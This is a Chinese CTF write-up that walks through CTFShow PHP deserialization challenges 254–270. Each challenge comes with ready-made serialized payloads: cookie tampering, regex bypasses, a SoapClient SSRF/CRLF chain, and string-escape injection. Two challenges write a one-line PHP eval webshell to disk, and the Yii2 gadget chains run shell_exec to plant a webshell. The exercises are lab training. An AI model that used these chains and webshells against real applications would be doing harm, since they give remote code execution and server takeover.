## 反序列化

### web254

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-02 17:44:47
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-02 19:29:02
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
highlight_file(__FILE__);
include('flag.php');

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;

    public function checkVip(){
        return $this->isVip;
    }
    public function login($u,$p){
        if($this->username===$u&&$this->password===$p){
            $this->isVip=true;
        }
        return $this->isVip;
    }
    public function vipOneKeyGetFlag(){
        if($this->isVip){
            global $flag;
            echo "your flag is ".$flag;
        }else{
            echo "no vip, no flag";
        }
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = new ctfShowUser();
    if($user->login($username,$password)){
        if($user->checkVip()){
            $user->vipOneKeyGetFlag();
        }
    }else{
        echo "no vip,no flag";
    }
}
```

这题纯纯试水用的，当username = xxxxxx & password = xxxxxx时，文件打开flag.php告诉你flag是多少。

payload：?username=xxxxxx&password=xxxxxx

![](F:/CTFShow-Web/Web入门/反序列化/图片/web254.png)



### web255

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-02 17:44:47
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-02 19:29:02
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
highlight_file(__FILE__);
include('flag.php');

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;

    public function checkVip(){
        return $this->isVip;
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function vipOneKeyGetFlag(){
        if($this->isVip){
            global $flag;
            echo "your flag is ".$flag;
        }else{
            echo "no vip, no flag";
        }
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = unserialize($_COOKIE['user']);    
    if($user->login($username,$password)){
        if($user->checkVip()){
            $user->vipOneKeyGetFlag();
        }
    }else{
        echo "no vip,no flag";
    }
}
```

又一次需要username和password的GET请求，然后对user的cookie进行反序列化，如果username 和password均为xxxxxx，同时

user的checkvip()通过(即user的isvip=true)，那就可以得到flag。

也就是说需要一个已经序列化好的user的cookie

先构造serialize.php：

```php
<?php
	class ctfShowUser{
    	public $isVip=true;
	}
	$a = new ctfShowUser();
	echo(urlencode(serialize($a)));

```

得到的值为O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D，这就是需要的cookie

使用BurpSuite重放

payload：?username=xxxxxx&password=xxxxxx

Cookie: user=O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D

请注意，使用BurpSuite时Cookie传递记得在Connection上面。

得到flag

![](F:/CTFShow-Web/Web入门/反序列化/图片/web255.png)



### web256

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-02 17:44:47
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-02 19:29:02
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
highlight_file(__FILE__);
include('flag.php');

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;

    public function checkVip(){
        return $this->isVip;
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function vipOneKeyGetFlag(){
        if($this->isVip){
            global $flag;
            if($this->username!==$this->password){
                    echo "your flag is ".$flag;
              }
        }else{
            echo "no vip, no flag";
        }
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = unserialize($_COOKIE['user']);    
    if($user->login($username,$password)){
        if($user->checkVip()){
            $user->vipOneKeyGetFlag();
        }
    }else{
        echo "no vip,no flag";
    }
}




```

多了一步对user的username和password的判断，要求不相等

构造序列化：

```
<?php
    class ctfShowUser
    {
        public $isVip = true;
        public $username='114514';
        public $password='1919810';
    }
    $user = new ctfShowUser();
    echo(urlencode(serialize($user)));
```

生成的序列化值为O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A5%3A%22isVip%22%3Bb%3A1%3Bs%3A8%3A%22username%22%3Bs%3A6%3A%22114514%22%3Bs%3A8%3A%22password%22%3Bs%3A7%3A%221919810%22%3B%7D

payload:?username=114514&password=1919810

Cookie: user=O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A5%3A%22isVip%22%3Bb%3A1%3Bs%3A8%3A%22username%22%3Bs%3A6%3A%22114514%22%3Bs%3A8%3A%22password%22%3Bs%3A7%3A%221919810%22%3B%7D

拿到flag

![](F:/CTFShow-Web/Web入门/反序列化/图片/web256.png)



### web257

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-02 17:44:47
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-02 20:33:07
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
highlight_file(__FILE__);

class ctfShowUser{
    private $username='xxxxxx';
    private $password='xxxxxx';
    private $isVip=false;
    private $class = 'info';

    public function __construct(){
        $this->class=new info();
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function __destruct(){
        $this->class->getInfo();
    }

}

class info{
    private $user='xxxxxx';
    public function getInfo(){
        return $this->user;
    }
}

class backDoor{
    private $code;
    public function getInfo(){
        eval($this->code);
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = unserialize($_COOKIE['user']);
    $user->login($username,$password);
}


```

首先读入username和password两个GET请求，然后还有一个叫user的cookie需要先序列化再输入。

注意__destruct()，它可以用来创建新的类，也就可以利用它来执行后门函数。

我们可以将class修改的值修改为一个backDoor对象，对backDoor类中的code属性进行赋值来达到rce

接下来进行判断：

首先user的username和password进入login()判断，这次只用存在即可

然后就没有然后了。

开始序列化：

```
<?php
    class ctfShowUser
    {
        public $username='xxxxxx';
        public $password='xxxxxx';
        public $isVip=true;
        public $class='backDoor';
 
        public function __construct()
        {
        $this->class=new backDoor();
        }
    }
    class backDoor
    {
        public $code='system("cat f*");';
    }
 
    $ctfShowUserObj = new ctfShowUser();
    $a = serialize($ctfShowUserObj);
    echo urlencode($a);
 
?>
```

序列化值为：O%3A11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3Bs%3A5%3A%22class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A17%3A%22system%28%22cat+f%2A%22%29%3B%22%3B%7D%7D

payload:?username=xxxxxx&password=xxxxxx

Cookie: user=O%3A11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3Bs%3A5%3A%22class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A17%3A%22system%28%22cat+f%2A%22%29%3B%22%3B%7D%7D

抓包执行后，已成功打开flag.php，查询源代码即可得到flag。

![](F:/CTFShow-Web/Web入门/反序列化/图片/web257.png)



### web258

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-02 17:44:47
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-02 21:38:56
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
highlight_file(__FILE__);

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;
    public $class = 'info';

    public function __construct(){
        $this->class=new info();
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function __destruct(){
        $this->class->getInfo();
    }

}

class info{
    public $user='xxxxxx';
    public function getInfo(){
        return $this->user;
    }
}

class backDoor{
    public $code;
    public function getInfo(){
        eval($this->code);
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    if(!preg_match('/[oc]:\d+:/i', $_COOKIE['user'])){
        $user = unserialize($_COOKIE['user']);
    }
    $user->login($username,$password);
}



```

本题需要执行后门函数值得注意的是user序列化的值这次又正则过滤了，过滤内容为“O:”的集合。

绕过方法为在前面加上“+”号。

开始进行序列化：

```
<?php
    class ctfShowUser
    {
        public $username='xxxxxx';
        public $password='xxxxxx';
        public $isVip=true;
        public $class='backDoor';
 
        public function __construct()
        {
            $this->class=new backDoor();
        }
    }
    class backDoor
    {
        public $code='system("cat f*");';
        public function getInfo()
        {
            eval($this->code);
        }
    }
 
    $ctfShowUserObj = new ctfShowUser();
    $a = serialize($ctfShowUserObj);
    $a = str_replace('O:','O:+',$a);
    echo urlencode($a);
 
?>

```

得到的序列化值为:

O%3A%2B11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3Bs%3A5%3A%22class%22%3BO%3A%2B8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A17%3A%22system%28%22cat+f%2A%22%29%3B%22%3B%7D%7D

payload：?username=xxxxxx&password=xxxxxx

Cookie: user=O%3A%2B11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3Bs%3A5%3A%22class%22%3BO%3A%2B8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A17%3A%22system%28%22cat+f%2A%22%29%3B%22%3B%7D%7D

执行完毕后在原网站查看源码即可得到flag。

![](F:/CTFShow-Web/Web入门/反序列化/图片/web258.png)



### web259(本地环境问题，根据视频讲解完成)

> 知识点
> 1.某个实例化的类，如果调用了一个不存在的函数会去调用__call魔术方法__call会发送一个请求
> 2.CRLF \r\n
> 3.POST数据提交最常用类型Content-Type:
> application/x-www-form-urlencoded。

题目限定:php7，关于更新版本的区别见下面

这次题目先给我们一个flag.php的源码:

```php
$xff = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
array_pop($xff);
$ip = array_pop($xff);


if($ip!=='127.0.0.1'){
	die('error');
}else{
	$token = $_POST['token'];
	if($token=='ctfshow'){
		file_put_contents('flag.txt',$flag);
	}
}
```

说明需要修改请求头的HTTP_X_FORWARDED_FOR为127.0.0.1，然后在接收一个token=ctfshow的POST请求才会打开flag.txt得到flag

先看一下靶机里面还有什么：

```
<?php

highlight_file(__FILE__);


$vip = unserialize($_GET['vip']);
//vip can get flag one key
$vip->getFlag();
```

说明先对vip的GET请求反序列化，然后将值传入getFlag()，问题是题目没告诉我们getFlag()是什么。

因此这题得使用php原生类进行反序列化攻击，考察函数为__call()，如何使用呢？**当调用不存在的时候，默认采用SoapClient的模式。**

SoapClient采用了HTTP作为底层通讯协议，XML作为数据传送的格式，其采用了SOAP协议(SOAP 是一
种简单的基于 XML 的协议,它使应用程序通过 HTTP 来交换信息)，其次我们知道某个实例化的类，如果
去调用了一个不存在的函数，会去调用 __call 方法

```
<?php
$client=new SoapClient(null,array('uri'=>"127.0.0.1",'location'=>"http://127.0.0.1:9999"));
$client->getFlag();  //调用不存在的方法，会自动调用——call()函数来发送请求
?>

```

*SoapClient采用了HTTP作为底层通讯协议，XML作为数据传送的格式，其采用了SOAP协议(SOAP 是一种简单的基于 XML 的协议,它使应用程序通过 HTTP 来交换信息)，其次我们知道某个实例化的类，如果去调用了一个不存在的函数，会去调用 __call 方法。下面我们一步步解释原理。*

由于是底层通讯协议，所以就不要拿这个代码去生成序列化了，将它传给服务器。

php：

```
<?php
$target = 'http://127.0.0.1/flag.php';
$post_string = 'token=ctfshow';
$b = new SoapClient(null,array('location' => $target,'user_agent'=>'^^X-Forwarded-For:127.0.0.1,127.0.0.1^^Content-Type: application/x-www-form-urlencoded'.'^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string,'uri'=> "ssrf"));
$a = serialize($b);
$a = str_replace('^^',"\r\n",$a);
echo urlencode($a);
?>
```

生成的序列化值为：

php7:

```
O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A4%3A%22ssrf%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A123%3A%22%0D%0AX-Forwarded-For%3A127.0.0.1%2C127.0.0.1%0D%0AContent-Type%3A+application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A+13%0D%0A%0D%0Atoken%3Dctfshow%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D
```

php8:

```
O%3A10%3A%22SoapClient%22%3A36%3A%7Bs%3A15%3A%22%00SoapClient%00uri%22%3Bs%3A3%3A%22aaa%22%3Bs%3A17%3A%22%00SoapClient%00style%22%3BN%3Bs%3A15%3A%22%00SoapClient%00use%22%3BN%3Bs%3A20%3A%22%00SoapClient%00location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A17%3A%22%00SoapClient%00trace%22%3Bb%3A0%3Bs%3A23%3A%22%00SoapClient%00compression%22%3BN%3Bs%3A15%3A%22%00SoapClient%00sdl%22%3BN%3Bs%3A19%3A%22%00SoapClient%00typemap%22%3BN%3Bs%3A22%3A%22%00SoapClient%00httpsocket%22%3BN%3Bs%3A19%3A%22%00SoapClient%00httpurl%22%3BN%3Bs%3A18%3A%22%00SoapClient%00_login%22%3BN%3Bs%3A21%3A%22%00SoapClient%00_password%22%3BN%3Bs%3A23%3A%22%00SoapClient%00_use_digest%22%3Bb%3A0%3Bs%3A19%3A%22%00SoapClient%00_digest%22%3BN%3Bs%3A23%3A%22%00SoapClient%00_proxy_host%22%3BN%3Bs%3A23%3A%22%00SoapClient%00_proxy_port%22%3BN%3Bs%3A24%3A%22%00SoapClient%00_proxy_login%22%3BN%3Bs%3A27%3A%22%00SoapClient%00_proxy_password%22%3BN%3Bs%3A23%3A%22%00SoapClient%00_exceptions%22%3Bb%3A1%3Bs%3A21%3A%22%00SoapClient%00_encoding%22%3BN%3Bs%3A21%3A%22%00SoapClient%00_classmap%22%3BN%3Bs%3A21%3A%22%00SoapClient%00_features%22%3BN%3Bs%3A31%3A%22%00SoapClient%00_connection_timeout%22%3Bi%3A0%3Bs%3A27%3A%22%00SoapClient%00_stream_context%22%3Bi%3A0%3Bs%3A23%3A%22%00SoapClient%00_user_agent%22%3Bs%3A129%3A%22aaaaaa%0D%0AContent-Type%3Aapplication%2Fx-www-form-urlencoded%0D%0AX-Forwarded-For%3A+127.0.0.1%2C127.0.0.1%0D%0AContent-Length%3A+13%0D%0A%0D%0Atoken%3Dctfshow%22%3Bs%3A23%3A%22%00SoapClient%00_keep_alive%22%3Bb%3A1%3Bs%3A23%3A%22%00SoapClient%00_ssl_method%22%3BN%3Bs%3A25%3A%22%00SoapClient%00_soap_version%22%3Bi%3A1%3Bs%3A22%3A%22%00SoapClient%00_use_proxy%22%3BN%3Bs%3A20%3A%22%00SoapClient%00_cookies%22%3Ba%3A0%3A%7B%7Ds%3A29%3A%22%00SoapClient%00__default_headers%22%3BN%3Bs%3A24%3A%22%00SoapClient%00__soap_fault%22%3BN%3Bs%3A26%3A%22%00SoapClient%00__last_request%22%3BN%3Bs%3A27%3A%22%00SoapClient%00__last_response%22%3BN%3Bs%3A34%3A%22%00SoapClient%00__last_request_headers%22%3BN%3Bs%3A35%3A%22%00SoapClient%00__last_response_headers%22%3BN%3B%7D
```

将php7生成的这个值作为vip的GET请求输入，根据flag.php的功能到目录下方查看flag.txt即可得到flag。

**记得运行前打开SoapCient原生类，默认是关闭的……**

然后如果要用这个，php版本不应该为8



### web260

```
<?php

error_reporting(0);
highlight_file(__FILE__);
include('flag.php');

if(preg_match('/ctfshow_i_love_36D/',serialize($_GET['ctfshow']))){
    echo $flag;
}

```

是这样的，首先包含了flag.php，如果ctfshow的GET请求序列化后有“ctfshow_i_love_36D”字样就给你flag。

可序列化又不更改对象名称，所以直接输入即可，这题纯吓唬人。

payload:?ctfshow=ctfshow_i_love_36D



### web261

```
<?php

highlight_file(__FILE__);

class ctfshowvip{
    public $username;
    public $password;
    public $code;

    public function __construct($u,$p){
        $this->username=$u;
        $this->password=$p;
    }
    public function __wakeup(){
        if($this->username!='' || $this->password!=''){
            die('error');
        }
    }
    public function __invoke(){
        eval($this->code);
    }

    public function __sleep(){
        $this->username='';
        $this->password='';
    }
    public function __unserialize($data){
        $this->username=$data['username'];
        $this->password=$data['password'];
        $this->code = $this->username.$this->password;
    }
    public function __destruct(){
        if($this->code==0x36d){
            file_put_contents($this->username, $this->password);
        }
    }
}

unserialize($_GET['vip']);
```

魔术方法的反序列化，一眼顶真。

看得出来我们应该执行__invoke()

在php7.4.0开始，如果类中同时定义了 __unserialize() 和 __wakeup() 两个魔术方法，则只有 __unserialize() 方法会生效，__wakeup() 方法会被忽略。 我们不需要考虑__wakeup,__invoke是类被进行函数调用时启用，也无法利用到，所以直接看看能不能写入文件。

0x36d十进制就等于877,因为是弱类型比较，像877a等都可以通过，所以我们用username='877.php',password='一句话木马'，不用在意那个wakeup

```
<?php
    class ctfshowvip
    {
        public $username;
        public $password;

        public function __construct($u, $p)
        {
            $this->username = $u;
            $this->password = $p;
        }
    }

    $a = new ctfshowvip('877.php', '<?=eval($_POST[1]);?>');
    echo urlencode(serialize($a));
?>
```

如此一来，当a被输入后，$code就会将username和password拼接起来再传给__destruct()中然后让它输出。这样我们就把木马成功写入877.php文件，之后用AntSword连接即可。

得到的序列化值为：

O%3A10%3A%22ctfshowvip%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A7%3A%22877.php%22%3Bs%3A8%3A%22password%22%3Bs%3A21%3A%22%3C%3F%3Deval%28%24_POST%5B1%5D%29%3B%3F%3E%22%3B%7D

用vip作为GET输入后，挂上木马，不过没有回显，无所谓了。访问877.php即可得到webshell，然后拿到flag。

flag在/flag_is_here中，害得我一顿好找。

![](F:\CTFShow-Web\Web入门\反序列化\图片\261.png)

### web262

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-03 02:37:19
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-03 16:05:38
# @message.php
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


error_reporting(0);
class message{
    public $from;
    public $msg;
    public $to;
    public $token='user';
    public function __construct($f,$m,$t){
        $this->from = $f;
        $this->msg = $m;
        $this->to = $t;
    }
}

$f = $_GET['f'];
$m = $_GET['m'];
$t = $_GET['t'];

if(isset($f) && isset($m) && isset($t)){
    $msg = new message($f,$m,$t);
    $umsg = str_replace('fuck', 'loveU', serialize($msg));
    setcookie('msg',base64_encode($umsg));
    echo 'Your message has been sent';
}

highlight_file(__FILE__);


```

**注释里告诉我们message.php,要求我们的token为admin**

**该题运用反序列化字符串逃逸，运用的思想跟sql注入的闭合相似**

**我们这里有一个序列化字符串，我们要改变token属性，但我们无法直接控制它的值。**

**我们只能给from，msg，to传递值，即这三个属性是可控的**

```
O:7:"message":4:{s:4:"from";s:1:"1";s:3:"msg";s:1:"2";s:2:"to";s:1:"3";s:5:"token";s:4:"user";}
```

**假如我们向to属性传递 t=3";s:5:"token";s:5:"admin";} 字符串就变为了下面这样**

```
O:7:"message":4:{s:4:"from";s:1:"1";s:3:"msg";s:1:"2";s:2:"to";s:27:"3";s:5:"token";s:4:"user";}";s:5:"token";s:5:"admin";}
```

**我们对字符串进来了闭合，这样我们就可以控制token属性的值了，但我们也会发现一点，to属性值的长度变为了27。**

**反序列化时，如果为27则会匹配后面27个字符，这样闭合就没有效果。**

**这时候题目中的替换字符函数可以帮助到我们**

```
$umsg = str_replace('fuck', 'loveU', serialize($msg));
```

**str_replace会将fuck替换为loveU，且替换是在序列化之后进行的，也就是说，实际字符串长度增加了1，但标明的字符串长度任然为原值**

```
// 替换前
s:2:"to";s:4:"fuck";
// 替换后
s:2:"to";s:4:"loveU";
```

**通过这种方法，我们就可以凭空增加字符，来成功进行闭合**

```
// t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck";s:5:"token";s:5:"admin";}
// 后面多出27个字符，所以我们写27个fuck，替换为loveU后，增加了27个字符，来达到字符串逃逸
```

**最终我们的payload为**

```
f=1&m=2&t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck";s:5:"token";s:5:"admin";}
```

这题十分的像pwn51，用魔法打败魔法。

然后访问message.php即可得到flag



### web263

按下F12后发现Script脚本

```
		function check(){
			$.ajax({
			url:'check.php',
			type: 'GET',
			data:{
				'u':$('#u').val(),
				'pass':$('#pass').val()
			},
			success:function(data){
				alert(JSON.parse(data).msg);
			},
			error:function(data){
				alert(JSON.parse(data).msg);
			}

		});
		}	
```

本题考查session反序列化漏洞，扫描目录可得www.zip，下载得到源代码

```
<?php

	error_reporting(0);
	session_start();
	//超过5次禁止登陆
	if(isset($_SESSION['limit'])){
		$_SESSION['limti']>5?die("登陆失败次数超过限制"):$_SESSION['limit']=base64_decode($_COOKIE['limit']);
		$_COOKIE['limit'] = base64_encode(base64_decode($_COOKIE['limit']) +1);
	}else{
		 setcookie("limit",base64_encode('1'));
		 $_SESSION['limit']= 1;
	}
	
?>

```

代码审计后主要有几个关键区域。

在index.php 我们发现$_SESSION['limit']我们可以进行控制

```
//超过5次禁止登陆
if(isset($_SESSION['limit'])){
  $_SESSION['limti']>5?die("登陆失败次数超过限制"):$_SESSION['limit']=base64_decode($_COOKIE['limit']);
  $_COOKIE['limit'] = base64_encode(base64_decode($_COOKIE['limit']) +1);
}else{
   setcookie("limit",base64_encode('1'));
   $_SESSION['limit']= 1;
}
```

flag在flag.php处，目测需要rce

```
$flag="flag_here";
```

inc.php 设置了session的序列化引擎为php，很有可能说明默认使用的是php_serialize

```
ini_set('session.serialize_handler', 'php');
```

并且inc.php中有一个User类的__destruct含有file_put_contents函数，并且username和password可控，可以进行文件包含geshell

```
   function __destruct(){
        file_put_contents("log-".$this->username, "使用".$this->password."登陆".($this->status?"成功":"失败")."----".date_create()->format('Y-m-d H:i:s'));
    }
```

开始构造EXP，生成payload

```
<?php
  class User{
    public $username;
    public $password;
    public $status;
    function __construct($username,$password){
        $this->username = $username;
        $this->password = $password;
    }
    function setStatus($s){
        $this->status=$s;
    }
    function __destruct(){
        file_put_contents("log-".$this->username, "使用".$this->password."登陆".($this->status?"成功":"失败")."----".date_create()->format('Y-m-d H:i:s'));
    }
  }

  $a = new User('1.php', '<?php eval($_POST[1]);phpinfo()?>');
  $a->setStatus('成功');
  echo ('|'.serialize($a));
?>

```

payload:

```
|O:4:"User":3:{s:8:"username";s:5:"1.php";s:8:"password";s:24:"";s:6:"status";s:6:"成功";}
```

在开发者工具的控制台替换cookie

```
document.cookie='limit=fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo1OiIxLnBocCI7czo4OiJwYXNzd29yZCI7czozNDoiPD9waHAgZXZhbCgkX1BPU1RbMV0pO3BocGluZm8oKTs/PiI7czo2OiJzdGF0dXMiO047fQ=='
```

访问check.php改写$_SESSION['limit'],将shell写入log-1.php

最后蚁剑访问log-1.php

```
POST 1=system("tac flag.php")
```

![](F:/CTFShow-Web/Web入门/反序列化/图片/web263.png)

![](F:/CTFShow-Web/Web入门/反序列化/图片/web263-蚁剑.png)



### web264

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-03 02:37:19
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-03 16:05:38
# @message.php
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


error_reporting(0);
session_start();

class message{
    public $from;
    public $msg;
    public $to;
    public $token='user';
    public function __construct($f,$m,$t){
        $this->from = $f;
        $this->msg = $m;
        $this->to = $t;
    }
}

$f = $_GET['f'];
$m = $_GET['m'];
$t = $_GET['t'];

if(isset($f) && isset($m) && isset($t)){
    $msg = new message($f,$m,$t);
    $umsg = str_replace('fuck', 'loveU', serialize($msg));
    $_SESSION['msg']=base64_encode($umsg);
    echo 'Your message has been sent';
}

highlight_file(__FILE__);

```

源码中显示输入f,m,t三个GET请求后，将fuck替换为loveU，将t替换为msg的序列化结果。然后msg应当和umsg的base64编码相同。

当

```
?f=a&m=b&t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck";s:5:"token";s:4:"admin";}
```

时，字符串数量正确

注意message.php处需要自行输入名为msg的Cookie

![](F:/CTFShow-Web/Web入门/反序列化/图片/web264.png)

### web265

```
<?php
error_reporting(0);
include('flag.php');
highlight_file(__FILE__);
class ctfshowAdmin{
    public $token;
    public $password;

    public function __construct($t,$p){
        $this->token=$t;
        $this->password = $p;
    }
    public function login(){
        return $this->token===$this->password;
    }
}

$ctfshow = unserialize($_GET['ctfshow']);
$ctfshow->token=md5(mt_rand());

if($ctfshow->login()){
    echo $flag;
}
```

对ctfshow的GET请求反序列化，若login存在输出flag。

login()则是检查token和password是否相等，很明显源代码中ctfshow的token为随机值。

考察php按地址传参，直接将二者绑定。

例如

```
$a = '1';
$b = &$a; // 这样相当于把&a指向的地址传给了&b
$a = '1' // 当&a的值发生改变，$b也会发生改变
```

payload:

```
?ctfshow=O%3A12%3A%22ctfshowAdmin%22%3A2%3A%7Bs%3A5%3A%22token%22%3Bi%3A1%3Bs%3A8%3A%22password%22%3BR%3A2%3B%7D
```

![](F:/CTFShow-Web/Web入门/反序列化/图片/web265.png)



### web266

```
<?php

highlight_file(__FILE__);

include('flag.php');
$cs = file_get_contents('php://input');


class ctfshow{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public function __construct($u,$p){
        $this->username=$u;
        $this->password=$p;
    }
    public function login(){
        return $this->username===$this->password;
    }
    public function __toString(){
        return $this->username;
    }
    public function __destruct(){
        global $flag;
        echo $flag;
    }
}
$ctfshowo=@unserialize($cs);
if(preg_match('/ctfshow/', $cs)){
    throw new Exception("Error $ctfshowo",1);
}
```

POST传参

```
<?php
class ctfshow{
    public $username='xxxxxx';
    public $password='xxxxxx';
}
echo serialize(new ctfshow())
?>
```

反序列化结果大小写不敏感，ctfshow改为cTFsHow即可。

payload:

```
O:7:"cTFsHow":2:{s:8:"username";s:6:"xxxxxx";s:8:"password";s:6:"xxxxxx";}
```

![](F:/CTFShow-Web/Web入门/反序列化/图片/web266.png)

### web267

#### Yii2反序列化漏洞

login处，admin&admin弱口令登录

发现<!--?view-source -->，?r=site%2Fabout&view-source查看

///backdoor/shell
unserialize(base64_decode($_GET['code']))

谢谢哦。

```
<?php
namespace yii\rest{
    class CreateAction{
        public $checkAccess;
        public $id;
 
        public function __construct(){
            $this->checkAccess = 'ls';
            $this->id = '1';
        }
    }
}
 
namespace Faker{
    use yii\rest\CreateAction;
 
    class Generator{
        protected $formatters;
 
        public function __construct(){
            $this->formatters['close'] = [new CreateAction(), 'run'];
        }
    }
}
 
namespace yii\db{
    use Faker\Generator;
 
    class BatchQueryResult{
        private $_dataReader;
 
        public function __construct(){
            $this->_dataReader = new Generator;
        }
    }
}
namespace{
    echo base64_encode(serialize(new yii\db\BatchQueryResult));
}

```

payload:

```
?r=/backdoor/shell&code=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6ODoicGFzc3RocnUiO3M6MjoiaWQiO3M6OToidGFjIC9mbGFnIjt9aToxO3M6MzoicnVuIjt9fX19
```

![](F:/CTFShow-Web/Web入门/反序列化/图片/web267.png)

### web268-270

同样的漏洞，但是需要换一个链子：

```
<?php

namespace yii\rest {
    class Action
    {
        public $checkAccess;
    }
    class IndexAction
    {
        public function __construct($func, $param)
        {
            $this->checkAccess = $func;
            $this->id = $param;
        }
    }
}
namespace yii\web {
    abstract class MultiFieldSession
    {
        public $writeCallback;
    }
    class DbSession extends MultiFieldSession
    {
        public function __construct($func, $param)
        {
            $this->writeCallback = [new \yii\rest\IndexAction($func, $param), "run"];
        }
    }
}
namespace yii\db {
    use yii\base\BaseObject;
    class BatchQueryResult
    {
        private $_dataReader;
        public function __construct($func, $param)
        {
            $this->_dataReader = new \yii\web\DbSession($func, $param);
        }
    }
}
namespace {
    $exp = new \yii\db\BatchQueryResult('shell_exec', 'echo "<?php eval(\$_POST[1]);phpinfo();?>" >/var/www/html/basic/web/1.php');
    echo(base64_encode(serialize($exp)));
}
?>

```

访问1.php可以直接看到phpinfo()，说明木马已经成功植入。

